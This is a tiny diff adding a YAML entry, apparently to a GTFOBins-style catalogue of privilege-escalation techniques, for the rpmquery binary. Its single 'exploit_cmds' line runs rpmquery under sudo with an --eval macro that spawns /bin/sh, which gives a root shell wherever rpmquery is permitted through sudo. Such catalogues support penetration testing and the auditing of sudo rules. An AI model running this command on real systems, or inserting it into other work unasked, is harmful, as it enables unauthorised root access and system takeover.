@@ -1,0 +1,4 @@
+name: rpmquery
+binary_path: /usr/bin/rpmquery
+exploit_cmds:
+- sudo /usr/bin/rpmquery --eval '%(/bin/sh 1>&2)'
